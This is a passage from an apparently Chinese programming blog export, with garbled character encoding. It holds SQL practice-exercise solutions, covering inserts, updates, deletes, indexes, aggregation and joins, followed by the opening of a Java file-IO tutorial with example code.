cust_state = 'MI' \n#ORDER BY cust_name; \nUNION \nSELECT cust_name, cust_contact, cust_email FROM Customers \nWHERE cust_state = 'IL'\nORDER BY cust_name;\n```\n\n## ä¸‰ã€SQLè¿›é˜¶ç¯‡\n\n- [x] ğŸŒŸè¿›é˜¶ç¯‡ï¼š46é“é¢˜\n- [x] ğŸ•¸é¢˜ç›®åœ°å€ï¼š[ç‰›å®¢ç½‘](https://www.nowcoder.com/exam/oj?tab=SQLç¯‡&topicId=240)\n- [x] ğŸš©å°ç®€è®¡åˆ’ï¼šé¢„è®¡5å¤©å†™å®Œ\n- [x] ğŸ¯å¼€å§‹æ—¶é—´ï¼š03-07 13é“ 03-08 5é“\n- [x] ğŸ‰ç»“æŸæ—¶é—´ï¼š03-0x\n\n### 01-å¢åˆ æ”¹æ“ä½œ\n\n#### SQL1 æ’å…¥è®°å½•ï¼ˆä¸€ï¼‰\n\né¢˜è§£ï¼š\n\n```sql\nINSERT INTO exam_record VALUES(null,1001,9001,'2021-09-01 22:11:12','2021-09-01 23:01:12',90),(null,1002,9002,'2021-09-04 07:01:02',null,null)\n```\n\n#### SQL2 æ’å…¥è®°å½•ï¼ˆäºŒï¼‰\n\n- æŠŠä¸€ä¸ªè¡¨çš„æ•°æ®æ’å…¥åˆ°å¦ä¸€ä¸ªè¡¨ä¸­(æŒ‡å®šå­—æ®µ)\n\n```sql\nINSERT  INTO ç›®æ ‡è¡¨ (å­—æ®µ1, å­—æ®µ2, ...) SELECT å­—æ®µ1, å­—æ®µ2,... FROM æ¥æºè¡¨  [WHERE key=value]\n```\n\né¢˜è§£ï¼š\n\n```sql\nINSERT INTO exam_record_before_2021(uid, exam_id, start_time, submit_time, score)\nSELECT uid, exam_id, start_time, submit_time, score\nFROM exam_record\nWHERE YEAR(submit_time) < '2021';\n```\n\n#### SQL3 æ’å…¥è®°å½•ï¼ˆä¸‰ï¼‰-replace\n\n- replace into è·Ÿ insert into åŠŸèƒ½ç±»ä¼¼\n\n- ä¸åŒç‚¹åœ¨äºï¼šreplace into é¦–å…ˆå°è¯•æ’å…¥æ•°æ®åˆ°è¡¨ä¸­\n\n  - å¦‚æœå‘ç°è¡¨ä¸­å·²ç»æœ‰æ­¤è¡Œæ•°æ®ï¼ˆæ ¹æ®ä¸»é”®æˆ–è€…å”¯ä¸€ç´¢å¼•åˆ¤æ–­ï¼‰åˆ™å…ˆåˆ é™¤æ­¤è¡Œæ•°æ®ï¼Œç„¶åæ’å…¥æ–°çš„æ•°æ®ï¼›\n\n  - å¦åˆ™ï¼Œç›´æ¥æ’å…¥æ–°æ•°æ®ã€‚\n\n- è¦æ³¨æ„çš„æ˜¯ï¼šæ’å…¥æ•°æ®çš„è¡¨å¿…é¡»æœ‰ä¸»é”®æˆ–è€…æ˜¯å”¯ä¸€ç´¢å¼•ï¼å¦åˆ™çš„è¯ï¼Œreplace into ä¼šç›´æ¥æ’å…¥æ•°æ®ï¼Œè¿™å°†å¯¼è‡´è¡¨ä¸­å‡ºç°é‡å¤çš„æ•°æ®ã€‚\n\né¢˜è§£1ï¼š\n\n```sql\nREPLACE INTO examination_info VALUES(null,9003,\"SQL\",\"hard\",90,\"2021-01-01 00:00:00\")\n```\n\né¢˜è§£2ï¼š\n\n```sql\nDELETE FROM examination_info\nWHERE exam_id=9003;\nINSERT INTO examination_info\nVALUES(NULL,9003, 'SQL','hard', 90, '2021-01-01 00:00:00')\n```\n\n#### SQL4 æ›´æ–°è®°å½•ï¼ˆä¸€ï¼‰\n\né¢˜è§£ï¼š\n\n```sql\nUPDATE examination_info \nSET tag = \"Python\" \nWHERE tag = \"PYTHON\"\n```\n\n#### SQL5 æ›´æ–°è®°å½•ï¼ˆäºŒï¼‰\n\né¢˜è§£ï¼š\n\n```sql\nUPDATE exam_record \nSET submit_time = \"2099-01-01 00:00:00\",score = 0 \nWHERE start_time < \"2021-09-01\" AND submit_time is null\n```\n\n#### SQL6 åˆ é™¤è®°å½•ï¼ˆä¸€ï¼‰-TIMESTAMPDIFF\n\næ—¶é—´å·®å‡½æ•°ï¼š\n\n- TIMESTAMPDIFF(interval, time_start, time_end)å¯è®¡ç®—time_start-time_endçš„æ—¶é—´å·®ï¼Œå•ä½ä»¥æŒ‡å®šçš„intervalä¸ºå‡†ï¼Œå¸¸ç”¨å¯é€‰ï¼š\n  - SECOND ç§’\n  - MINUTE åˆ†é’Ÿï¼ˆè¿”å›ç§’æ•°å·®é™¤ä»¥60çš„æ•´æ•°éƒ¨åˆ†ï¼‰\n  - HOUR å°æ—¶ï¼ˆè¿”å›ç§’æ•°å·®é™¤ä»¥3600çš„æ•´æ•°éƒ¨åˆ†ï¼‰\n  - DAY å¤©æ•°ï¼ˆè¿”å›ç§’æ•°å·®é™¤ä»¥3600*24çš„æ•´æ•°éƒ¨åˆ†ï¼‰\n  - MONTH æœˆæ•°\n  - YEAR å¹´æ•°\n\né¢˜è§£ï¼š\n\n```sql\nDELETE FROM exam_record \nWHERE timestampdiff(minute,start_time,submit_time) < 5 AND score < 60\n```\n\n#### SQL7 åˆ é™¤è®°å½•ï¼ˆäºŒï¼‰-LIMIT\n\né¢˜è§£ï¼š\n\n```sql\nDELETE FROM exam_record \nWHERE submit_time is null OR timestampdiff(minute,start_time,submit_time) < 5\nORDER BY start_time\nLIMIT 3\n```\n\n####  SQL8 åˆ é™¤è®°å½•ï¼ˆä¸‰ï¼‰-truncate\n\n1.DROP TABLEã€€æ¸…é™¤æ•°æ®å¹¶ä¸”é”€æ¯è¡¨ï¼Œæ˜¯ä¸€ç§æ•°æ®åº“å®šä¹‰è¯­è¨€(DDL Data Definition Language), æ‰§è¡Œåä¸èƒ½æ’¤é”€ï¼Œè¢«åˆ é™¤è¡¨æ ¼çš„å…³ç³»ï¼Œç´¢å¼•ï¼Œæƒé™ç­‰ç­‰éƒ½ä¼šè¢«æ°¸ä¹…åˆ é™¤ã€‚\n\n2.TRUNCATE TABLEã€€åªæ¸…é™¤æ•°æ®ï¼Œä¿ç•™è¡¨ç»“æ„ï¼Œåˆ—ï¼Œæƒé™ï¼Œç´¢å¼•ï¼Œè§†å›¾ï¼Œå…³ç³»ç­‰ç­‰ï¼Œç›¸å½“äºæ¸…é›¶æ•°æ®ï¼Œæ˜¯ä¸€ç§æ•°æ®åº“å®šä¹‰è¯­è¨€(DDL Data Definition Language)ï¼Œæ‰§è¡Œåä¸èƒ½æ’¤é”€ã€‚\n\n3.DELETE TABLEã€€åˆ é™¤ï¼ˆç¬¦åˆæŸäº›æ¡ä»¶çš„ï¼‰æ•°æ®ï¼Œæ˜¯ä¸€ç§æ•°æ®æ“çºµè¯­è¨€(DML Data Manipulation Language)ï¼Œæ‰§è¡Œåå¯ä»¥æ’¤é”€ã€‚\n\né¢˜è§£ï¼š\n\n```sql\n# -- æ¸…ç©ºè¡¨ï¼Œå¹¶å°†è‡ªå¢ä¸»é”®è®¾ç½®ä¸º1\ntruncate table exam_record\n  \n# -- æ¸…ç©ºè¡¨æ•°æ®ï¼Œè‡ªå¢ä¸»é”®ä¸æ¢å¤\nDELETE FROM exam_record;\nALTER TABLE exam_record auto_increment = 1;\n```\n\n### 02-è¡¨ä¸ç´¢å¼•æ“ä½œ\n\n#### SQL9 åˆ›å»ºä¸€å¼ æ–°è¡¨\n\né¢˜è§£ï¼š\n\n```sql\ncreate table user_info_vip(\n    id int(11) not null primary key auto_increment Comment \"è‡ªå¢ID\" ,\n    uid int(11) not null unique comment \"ç”¨æˆ·ID\",\n    nick_name varchar(64) comment \"æ˜µç§°\",\n    achievement\tint(11) default 0 comment \"æˆå°±å€¼\",\n    level int(11) comment \"ç”¨æˆ·ç­‰çº§\",\n    job\tvarchar(32) comment \"èŒä¸šæ–¹å‘\",\n    register_time datetime default CURRENT_TIMESTAMP comment \"æ³¨å†Œæ—¶é—´\"\n)character set utf8 collate utf8_general_ci engine innodb\n```\n\n#### SQL10 ä¿®æ”¹è¡¨\n\né¢˜è§£ï¼š\n\n```sql\nalter table user_info\nadd school varchar(15) after `level`,\nchange job profession varchar(10),\nmodify achievement int(11) default 0\n```\n\n#### SQL11-åˆ é™¤è¡¨\n\né¢˜è§£ï¼š\n\n```sql\nDROP TABLE IF EXISTS exam_record_2011,exam_record_2012,exam_record_2013,exam_record_2014\n```\n\n#### SQL12-åˆ›å»ºç´¢å¼•\n\nç´¢å¼•åˆ›å»ºï¼š\n\n- 1.1 createæ–¹å¼åˆ›å»ºç´¢å¼•ï¼š\n\n```sql\nCREATE [UNIQUE | FULLTEXT] INDEX ç´¢å¼•å ON è¡¨å \n(column1[(length) [DESC|ASC]] [,column2,...]) -- å¯ä»¥å¯¹å¤šåˆ—å»ºç«‹ç»„åˆç´¢å¼• \n\n# UNIQUE -- å”¯ä¸€ç´¢å¼•\n# FULLTEXT -- å…¨æ–‡ç´¢å¼• \n# ä¸æŒ‡å®šå”¯ä¸€ç´¢å¼•æˆ–å…¨æ–‡ç´¢å¼•æ—¶é»˜è®¤ä¸ºæ™®é€šç´¢å¼•\n```\n\n- 1.2 alteræ–¹å¼åˆ›å»ºç´¢å¼•ï¼š\n\n```sql\nALTER TABLE è¡¨å \nADD [UNIQUE | FULLTEXT] INDEX ç´¢å¼•å(column)`\n```\n\nç´¢å¼•åˆ é™¤\n\n- 2.1 dropæ–¹å¼åˆ é™¤ç´¢å¼•ï¼š`DROP INDEX <ç´¢å¼•å> ON <è¡¨å>`\n- 2.2 alteræ–¹å¼åˆ é™¤ç´¢å¼•ï¼š`ALTER TABLE <è¡¨å> DROP INDEX <ç´¢å¼•å>`\n\nç´¢å¼•ä½¿ç”¨ï¼š\n\n- ç´¢å¼•ä½¿ç”¨æ—¶æ»¡è¶³æœ€å·¦å‰ç¼€åŒ¹é…åŸåˆ™ï¼Œå³å¯¹äºç»„åˆç´¢å¼•(col1, col2)ï¼Œåœ¨ä¸è€ƒè™‘å¼•æ“ä¼˜åŒ–æ—¶ï¼Œæ¡ä»¶å¿…é¡»æ˜¯col1åœ¨å‰col2åœ¨åï¼Œæˆ–è€…åªä½¿ç”¨col1ï¼Œç´¢å¼•æ‰ä¼šç”Ÿæ•ˆï¼›\n- ç´¢å¼•ä¸åŒ…å«æœ‰NULLå€¼çš„åˆ—\n- ä¸€ä¸ªæŸ¥è¯¢åªä½¿ç”¨ä¸€æ¬¡ç´¢å¼•ï¼Œwhereä¸­å¦‚æœä½¿ç”¨äº†ç´¢å¼•ï¼Œorder byå°±ä¸ä¼šä½¿ç”¨\n- likeåšå­—æ®µæ¯”è¾ƒæ—¶åªæœ‰å‰ç¼€ç¡®å®šæ—¶æ‰ä¼šä½¿ç”¨ç´¢å¼•\n- åœ¨åˆ—ä¸Šè¿›è¡Œè¿ç®—åä¸ä¼šä½¿ç”¨ç´¢å¼•ï¼Œå¦‚year(start_time)<2020ä¸ä¼šä½¿ç”¨start_timeä¸Šçš„ç´¢å¼•\n\né¢˜è§£1ï¼š\n\n```sql\nCREATE INDEX idx_duration ON examination_info(duration);\nCREATE UNIQUE INDEX uniq_idx_exam_id ON examination_info(exam_id);\nCREATE FULLTEXT INDEX full_idx_tag ON examination_info(tag);\n```\n\né¢˜è§£2:\n\n```sql\n-- å”¯ä¸€ç´¢å¼•\nALTER TABLE examination_info\nADD UNIQUE INDEX uniq_idx_exam_id(exam_id);\n \n-- å…¨æ–‡ç´¢å¼•\nALTER TABLE examination_info\nADD FULLTEXT INDEX full_idx_tag(tag);\n \n-- æ™®é€šç´¢å¼•\nALTER TABLE examination_info\nADD INDEX idx_duration(duration);\n```\n\n#### SQL13-åˆ é™¤ç´¢å¼•\n\nåˆ é™¤\n\n- 1ã€dropæ–¹å¼åˆ é™¤ç´¢å¼•ï¼š`DROP INDEX <ç´¢å¼•å> ON <è¡¨å>`\n- 2ã€alteræ–¹å¼åˆ é™¤ç´¢å¼•ï¼š`ALTER TABLE <è¡¨å> DROP INDEX <ç´¢å¼•å>`\n\né¢˜è§£1ï¼š\n\n```sql\nDROP INDEX uniq_idx_exam_id ON examination_info;\nDROP INDEX full_idx_tag ON examination_info;\n```\n\né¢˜è§£2:\n\n```sql\nALTER TABLE examination_info DROP INDEX uniq_idx_exam_id;\nALTER TABLE examination_info DROP INDEX full_idx_tag;\n```\n\n### 03-èšåˆåˆ†ç»„æŸ¥è¯¢\n\n#### SQL14 SQLç±»åˆ«é«˜éš¾åº¦è¯•å·å¾—åˆ†çš„æˆªæ–­å¹³å‡å€¼\n\né¢˜è§£ï¼š\n\n```sql\nselect \n    tag,\n    difficulty,\n    round((sum(score)-(max(score)+min(score)))/(count(score)-2),1) clip_avg_score\nfrom examination_info t1\ninner join exam_record t2 \non t1.exam_id = t2.exam_id\nwhere tag = \"SQL\" and difficulty = \"hard\"\n```\n\n####  SQL15 ç»Ÿè®¡ä½œç­”æ¬¡æ•°\n\né¢˜è§£1:\n\n```sql\nSELECT\n    COUNT(exam_id) AS total_pv,\n    COUNT(submit_time) AS complete_pv,\n    COUNT(DISTINCT exam_id AND score IS NOT NULL) AS complete_exam_cnt\nFROM exam_record\n```\n\né¢˜è§£2ï¼š\n\n```sql\nSELECT\n    COUNT(exam_id) AS total_pv,\n    COUNT(submit_time) AS complete_pv,\n    COUNT(DISTINCT IF(score IS NOT NULL,exam_id,NULL)) AS complete_exam_cnt\nFROM exam_record\n```\n\n#### SQL16 å¾—åˆ†ä¸å°äºå¹³å‡åˆ†çš„æœ€ä½åˆ†\n\né¢˜è§£1ï¼šèšåˆå‡½æ•°æ±‚å‡ºå¹³å‡å€¼ï¼Œä½œä¸ºè¡¨ä¸­çš„ä¸€ä¸ªç­›é€‰æ¡ä»¶\n\n```sql\nselect min(t1.score) min_score_over_avg \nfrom exam_record t1\nleft join examination_info t2 on t1.exam_id = t2.exam_id\nwhere t2.tag = 'SQL' \nand t1.score >= (\n    select avg(t1.score) \n    from exam_record t1\n    left join examination_info t2 on t1.exam_id = t2.exam_id\n    where t2.tag = 'SQL');\n```\n\né¢˜è§£2:ç”¨çª—å£å‡½æ•°ç›´æ¥æ±‚å‡ºavgï¼Œä½œä¸ºä¸€åˆ—ã€‚ç„¶åscoreä¸avgæ¯”è¾ƒ\n\n```sql\nselect min(t.score) min_score_over_avg \nfrom (select t1.score,avg(t1.score) over() avg_score \n      from exam_record t1\n      left join examination_info t2 on t1.exam_id = t2.exam_id\n      where t2.tag = 'SQL' and t1.score is not null) as t\nwhere t.score >= t.avg_score; \n```\n\n#### SQL17 å¹³å‡æ´»è·ƒå¤©æ•°å’Œæœˆæ´»äººæ•°\n\næœ¬é¢˜é™·é˜±åœ¨äºä¹æœˆä»½æœ‰ä¸ªç”¨æˆ·åŒä¸€å¤©åšäº†ä¸¤ç§å·å­ï¼Œç›´æ¥countç»Ÿè®¡æ´»è·ƒå¤©æ•°ä¼šå¤šä¸€å¤©ï¼Œå³ç”¨æˆ·IDå’Œåšé¢˜æ—¥æœŸsubmit_timeè¦**åŒæ—¶å»é‡**æ‰èƒ½å¾—å‡ºæ­£ç¡®çš„æ´»è·ƒå¤©æ•°.\n\né¢˜è§£ï¼š\n\n```sql\nselect \n    date_format(start_time,\"%Y%m\") as month,\n    round(count(distinct uid,date_format(submit_time,'%Y%m%d'))/count(distinct uid),2) as avg_active_days,\n    count(distinct uid) as mau\nfrom exam_record\nwhere year(submit_time) = 2021\ngroup by month\n```\n\n#### SQL18 æœˆæ€»åˆ·é¢˜æ•°å’Œæ—¥å‡åˆ·é¢˜æ•°\n\nlast_day()å‡½æ•°ï¼šè·å–å¯¹åº”æœˆçš„æœ€åä¸€å¤©çš„æ—¥æœŸ\n\nday()å‡½æ•°ï¼šå–å‡ºå¤©æ•°\n\nå› ä¸ºæœ‰å¤šä¸ª submit_timeï¼Œæ‰€ä»¥å† avg() å–ä¸ªå€¼\n\né¢˜è§£ï¼š\n\n```sql\nselect\n   date_format(submit_time,\"%Y%m\") as submit_month,\n   count(date_format(submit_time,\"%Y%m\")) as month_q_cnt,\n   round(count(submit_time)/avg(day(last_day(submit_time))),3) as avg_day_q_cnt\nfrom practice_record\nwhere year(submit_time) = 2021\ngroup by DATE_FORMAT(submit_time, \"%Y%m\")\nunion ALL\nSELECT '2021æ±‡æ€»' as submit_month,\ncount(question_id) month_q_cnt,\nround(count(id)/31,3) avg_day_q_cnt\nfrom practice_record\nwhere year(submit_time) = 2021\norder by submit_month;\n```\n\n#### SQL19 æœªå®Œæˆè¯•å·æ•°å¤§äº1çš„æœ‰æ•ˆç”¨æˆ·\n\n- å¯¹äºæ¯æ¡ä½œç­”tagï¼Œç”¨:è¿æ¥æ—¥æœŸå’Œtagï¼š`concat_ws(':', date(start_time), tag)`\n- å¯¹äºä¸€ä¸ªäººï¼ˆç»„å†…ï¼‰çš„å¤šæ¡ä½œç­”ï¼Œç”¨ ; è¿æ¥å»é‡åçš„ä½œç­”è®°å½•ï¼š`group_concat(distinct concat_ws(':', date(start_time), tag) separator ';')`\n\né¢˜è§£ï¼š\n\n```sql\nselect \n    uid,\n    (count(start_time) - count(submit_time)) as incomplete_cnt,\n    count(submit_time) as complete_cnt,\n    group_concat(distinct concat(date(start_time),':',tag) order by start_time asc separator ';') as detail\nfrom exam_record as t1\nleft join examination_info as t2\non t1.exam_id = t2.exam_id\nwhere year(start_time) = 2021\ngroup by t1.uid\nhaving complete_cnt>=1 and incomplete_cnt<5 and incomplete_cnt>1 \norder by incomplete_cnt desc\n```\n\n### 04-å¤šè¡¨æŸ¥è¯¢\n\n#### SQL20 æœˆå‡å®Œæˆè¯•å·æ•°ä¸å°äº3çš„ç”¨æˆ·çˆ±ä½œç­”çš„ç±»åˆ«\n\n- ç­›é€‰æœˆå‡å®Œæˆæ•°ä¸å°äº3çš„ç”¨æˆ·ã€‚çŸ¥è¯†ç‚¹ï¼š\n  - æŒ‰ç”¨æˆ·åˆ†ç»„ `group by uid`\n  - ç»Ÿè®¡å½“å‰ç”¨æˆ·å®Œæˆè¯•å·æ€»æ•°  `count(exam_id)`\n  - ç»Ÿè®¡è¯¥ç”¨æˆ·æœ‰å®Œæˆè¯•å·çš„æœˆä»½æ•° `count(distinct DATE_FORMAT(start_time, \"%Y%m\"))`\n  - åˆ†ç»„åè¿‡æ»¤ `having count(exam_id) / count(distinct DATE_FORMAT(start_time, \"%Y%m\")) >= 3`\n\né¢˜è§£ï¼š\n\n```sql\nselect tag,count(tag) as tag_cnt\nfrom exam_record as t1\ninner join examination_info as t2\non t1.exam_id = t2.exam_id \nwhere uid in (\n    select uid\n    from exam_record\n    where submit_time is not null\n    group by uid\n    having count(exam_id) / count(distinct DATE_FORMAT(start_time, \"%Y%m\")) >= 3\n)\ngroup by tag\norder by tag_cnt desc\n```\n\n#### SQL21 è¯•å·å‘å¸ƒå½“å¤©ä½œç­”äººæ•°å’Œå¹³å‡åˆ†\n\né¢˜è§£ï¼š\n\n```sql\nselect \n    t2.exam_id,\n    count(distinct t1.uid) as uv,\n    round(avg(score),1) as avg_score\nfrom user_info as t1\ninner join exam_record as t3 on t1.uid = t3.uid\ninner join examination_info as t2 on t2.exam_id = t3.exam_id\nwhere t1.level > 5 and t2.tag = \"SQL\" and date(submit_time) = date(release_time) and score is not null\nGROUP BY exam_id\norder by uv desc,avg_score\n```\n\n#### SQL22 ä½œç­”è¯•å·å¾—åˆ†å¤§äºè¿‡80çš„äººçš„ç”¨æˆ·ç­‰çº§åˆ†å¸ƒ\n\né¢˜è§£1ï¼š\n\n- `select * from () t1 union select * from () t2`\n\n```sql\nselect level,count(level) as level_cnt\nfrom exam_record as t3\ninner join examination_info as t2\non t3.exam_id = t2.exam_id\ninner join user_info as t1\non t1.uid = t3.uid\nwhere tag = 'SQL' and score > 80\ngroup by level\norder by level_cnt desc\n```\n\né¢˜è§£2:\n\n```sql\nselect exam_id as tid,count(distinct er.uid) as uv,count(exam_id) as pv\nfrom exam_record er \ngroup by exam_id\nunion all\nselect question_id as tid,count(distinct pr.uid) as uv,count(question_id) as pv\nfrom practice_record pr \ngroup by question_id\norder by left(tid,1) desc, uv desc,pv desc \n```\n\n#### SQL23 æ¯ä¸ªé¢˜ç›®å’Œæ¯ä»½è¯•å·è¢«ä½œç­”çš„äººæ•°å’Œæ¬¡æ•°\n\né¢˜è§£ï¼š\n\n```sql\nselect * from\n(select exam_id as tid,\n       count(distinct uid) as uv,\n       count(*) as pv\nfrom exam_record\ngroup by exam_id\norder by uv desc, pv desc) as t1\nunion\nselect * from\n(select question_id as tid,\n       count(distinct uid) as uv,\n       count(*) as pv\nfrom practice_record\ngroup by question_id\norder by uv desc, pv desc) as t2\n```\n\næš‚åœåˆ·é¢˜ï¼Œåé¢å†æ¥ç€åˆ·ã€‚ã€‚ã€‚\n\n#### SQL24 åˆ†åˆ«æ»¡è¶³ä¸¤ä¸ªæ´»åŠ¨çš„äºº\n\né¢˜è§£ï¼š\n\n```sql\n\n```\n\n#### SQL25 æ»¡è¶³æ¡ä»¶çš„ç”¨æˆ·çš„è¯•å·å®Œæˆæ•°å’Œé¢˜ç›®ç»ƒä¹ æ•°\n\né¢˜è§£ï¼š\n\n```sql\n\n```\n\n#### SQL26 æ¯ä¸ª6/7çº§ç”¨æˆ·æ´»è·ƒæƒ…å†µ\n\né¢˜è§£ï¼š\n\n```sql\n\n```\n\n### 05-çª—å£å‡½æ•°\n\n#### SQL27 æ¯ç±»è¯•å·å¾—åˆ†å‰3å\n\né¢˜è§£ï¼š\n\n```sql\n\n```\n\n#### SQL28 ç¬¬äºŒå¿«/æ…¢ç”¨æ—¶ä¹‹å·®å¤§äºè¯•å·æ—¶é•¿ä¸€åŠçš„è¯•å·\n\né¢˜è§£ï¼š\n\n```sql\n\n```\n\n#### SQL29 è¿ç»­ä¸¤æ¬¡ä½œç­”è¯•å·çš„æœ€å¤§æ—¶é—´çª—\n\né¢˜è§£ï¼š\n\n```sql\n\n```\n\n\n\n## å››ã€SQLçœŸé¢˜ç¯‡\n\n- [x] ğŸŒŸè¿›é˜¶ç¯‡ï¼š39é“é¢˜\n- [x] ğŸ•¸é¢˜ç›®åœ°å€ï¼š[ç‰›å®¢ç½‘](https://www.nowcoder.com/exam/oj?tab=SQLç¯‡&topicId=268)\n- [x] ğŸš©å°ç®€è®¡åˆ’ï¼šé¢„è®¡ä¸€å‘¨å†™å®Œ\n- [x] ğŸ¯å¼€å§‹æ—¶é—´ï¼š0x-0x\n- [x] ğŸ‰ç»“æŸæ—¶é—´ï¼š0x-0x\n\n\n\n## â¤ï¸Sponsor\n\næ‚¨çš„æ”¯æŒæ˜¯æˆ‘ä¸æ–­å‰è¿›çš„åŠ¨åŠ›ï¼Œå¦‚æœæ‚¨æ°å·§è´¢åŠ›é›„åšï¼Œåˆæ„Ÿè§‰æœ¬æ–‡å¯¹æ‚¨æœ‰æ‰€å¸®åŠ©çš„è¯ï¼Œå¯ä»¥è€ƒè™‘æ‰“èµä¸€ä¸‹æœ¬æ–‡ï¼Œç”¨ä»¥ç»´æŒæœ¬åšå®¢çš„è¿è¥è´¹ç”¨ï¼Œæ‹’ç»ç™½å«–ï¼Œä»ä½ æˆ‘åšèµ·ï¼ğŸ¥°ğŸ¥°ğŸ¥°\n\n<table>\n  <tbody>\n     <tr>\n         <td style=\"text-align:center;\">æ”¯ä»˜å®æ”¯ä»˜</td>\n         <td style=\"text-align:center;\">å¾®ä¿¡æ”¯ä»˜</td>\n     </tr>\n   <tr>\n    <td style=\"text-align:center;\" ><img width=\"200\" src=\"https://jwt1399.top/medias/reward/alipay.png\"></td>    \n      <td style=\"text-align:center;\"><img width=\"200\" src=\"https://jwt1399.top/medias/reward/sponor_wechat.png\"></td>     \n  </tr>\n</tbody></table>\n","tags":["MySQL"],"categories":["SQL"]},{"title":"Java-IOæµ","url":"/posts/52970.html","content":"\n## å‰è¨€\n\nå“ˆå–½ï¼å¤§å®¶å¥½ï¼Œæˆ‘æ˜¯å°ç®€ã€‚ä»Šå¤©å¼€å§‹å­¦ä¹ ã€ŠJava-IOæµã€‹ï¼Œæ­¤ç³»åˆ—æ˜¯æˆ‘åšçš„ä¸€ä¸ª â€œJava ä» 0 åˆ° 1 â€ å®éªŒï¼Œç»™è‡ªå·±ä¸€å¹´å·¦å³æ—¶é—´ï¼ŒæŒ‰ç…§æˆ‘è‡ªå·±æ€»ç»“çš„ [Java-å­¦ä¹ è·¯çº¿](https://jwt1399.top/posts/29829.html)ï¼Œä» 0 å¼€å§‹å­¦ Java çŸ¥è¯†ï¼Œå¹¶ä¸å®šæœŸæ›´æ–°æ‰€å­¦ç¬”è®°ï¼ŒæœŸå¾…ä¸€å¹´åçš„èœ•å˜å§ï¼<æœ‰åŒæ ·æƒ³æ³•çš„å°ä¼™ä¼´ï¼Œå¯ä»¥è”ç³»æˆ‘ä¸€èµ·äº¤æµå­¦ä¹ å“¦ï¼>\n\n- [x] ğŸš©æ—¶é—´å®‰æ’ï¼šé¢„è®¡ä¸€å‘¨æ›´æ–°å®Œ\n- [x] ğŸ¯å¼€å§‹æ—¶é—´ï¼š02-27\n- [x] ğŸ‰ç»“æŸæ—¶é—´ï¼š03-03\n- [x] ğŸ€æ€»ç»“ï¼šç”¨æ—¶ 5 å¤©ï¼Œæå‰ä¸¤å¤©å®Œæˆä»»åŠ¡ï¼Œç»§ç»­ä¸‹ä¸€ä¸ª ğŸš©\n\n## IOæµç®€ä»‹\n\n![](https://img.jwt1399.top/img/image-20220227144342066.png)\n\n- æµï¼šæ•°æ®åœ¨æ•°æ®æº(æ–‡ä»¶)å’Œç¨‹åº(å†…å­˜)ä¹‹é—´ç»å†çš„è·¯å¾„\n- è¾“å…¥æµï¼šæ•°æ®ä»æ•°æ®æº(æ–‡ä»¶)åˆ°ç¨‹åº(å†…å­˜)çš„è·¯å¾„\n- è¾“å‡ºæµï¼šæ•°æ®ä»ç¨‹åº(å†…å­˜)åˆ°æ•°æ®æº(æ–‡ä»¶)çš„è·¯å¾„\n### æµåˆ†ç±»\n\n- æŒ‰æ“ä½œæ•°æ®å•ä½ä¸åŒåˆ†ä¸º\n  - å­—èŠ‚æµ(8 bit) --é€‚åˆæ“ä½œäºŒè¿›åˆ¶æ–‡ä»¶\n  - å­—ç¬¦æµ(æŒ‰å­—ç¬¦) --é€‚åˆæ“ä½œæ–‡æœ¬æ–‡ä»¶\n- æŒ‰æ•°æ®æµçš„æµå‘ä¸åŒåˆ†ä¸º\n  - è¾“å…¥æµ\n  - è¾“å‡ºæµ\n- æŒ‰æµçš„è§’è‰²çš„ä¸åŒåˆ†ä¸º\n  - èŠ‚ç‚¹æµ\n  - å¤„ç†æµ/åŒ…è£…æµ\n\n![](https://img.jwt1399.top/img/image-20220227154413607.png)\n\n### ä½“ç³»å›¾\n\n![](https://img.jwt1399.top/img/image-20220227154216330.png)\n\n\n\n\n## æ–‡ä»¶æ“ä½œ\n\n### åˆ›å»ºæ–‡ä»¶\n\n- new File(String pathname) //æ ¹æ®è·¯å¾„æ„å»ºä¸€ä¸ªFileå¯¹è±¡\n- new File(File parent. String child) //æ ¹æ®çˆ¶ç›®å½•æ–‡ä»¶+å­è·¯å¾„æ„å»º\n- new File(String parent,String child) //æ ¹æ®çˆ¶ç›®å½•+å­è·¯å¾„æ„å»º\n- createNewFile() //æ–‡ä»¶åˆ›å»º\n\n```java\nimport org.junit.Test;\nimport java.io.File;\nimport java.io.IOException;\n\npublic class FileCreate {\n  \n    //new File(String pathname) //æ ¹æ®è·¯å¾„æ„å»ºä¸€ä¸ªFileå¯¹è±¡\n    @Test\n    public void create01(){\n        String pathname = \"/Users/jianjian/Downloads/test1.txt\";\n        File file = new File(pathname);\n        try {\n            file.createNewFile();\n            System.out.println(\"æ–‡ä»¶åˆ›å»ºæˆåŠŸ\");\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n  \n    //new File(File parent. String child) //æ ¹æ®çˆ¶ç›®å½•æ–‡ä»¶+å­è·¯å¾„æ„å»º\n    @Test\n    public void create02(){\n        File parentFile = new File(\"/Users/jianjian/Downloads/\");\n        String fileName = \"test2.txt\";\n        File file = new File(parentFile, fileName);\n        try {\n            file.createNewFile();\n            System.out.println(\"æ–‡ä»¶åˆ›å»ºæˆåŠŸ\");\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n\n    }\n  \n    //new File(String parent,String child) //æ ¹æ®çˆ¶ç›®å½•+å­è·¯å¾„æ„å»º\n    @Test\n    public void create03(){\n        String parentFile = \"/Users/jianjian/Downloads/\";\n        String fileName = \"test3.txt\";\n        File file = new File(parentFile, fileName);\n        try {\n            file.createNewFile();\n            System.out.println(\"æ–‡ä»¶åˆ›å»ºæˆåŠŸ\");\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}\n```\n\n### è·å–æ–‡ä»¶ä¿¡æ¯\n\n- getName() æ–‡ä»¶åå­—\n- getAbsolutePath() æ–‡ä»¶ç»å¯¹è·¯å¾„\n- file.getParent() æ–‡ä»¶çˆ¶çº§ç›®å½•\n- file.length() æ–‡ä»¶å¤§å°(å­—èŠ‚)\n- file.exists() æ–‡ä»¶æ˜¯å¦å­˜åœ¨\n- file.isFile() æ˜¯ä¸æ˜¯ä¸€ä¸ªæ–‡ä»¶\n- file.isDirectory() æ˜¯ä¸æ˜¯ä¸€ä¸ªç›®å½•\n\n```java\nimport org.junit.Test;\nimport java.io.File;\n\npublic class FileInfomation {\n    //è·å–æ–‡ä»¶çš„ä¿¡æ¯\n    @Test\n    public void info() {\n        //å…ˆåˆ›å»ºæ–‡ä»¶å¯¹è±¡\n        File file = new File(\"/Users/jianjian/Downloads/test.txt\");\n        //è°ƒç”¨ç›¸åº”çš„æ–¹æ³•ï¼Œå¾—åˆ°å¯¹åº”ä¿¡æ¯\n        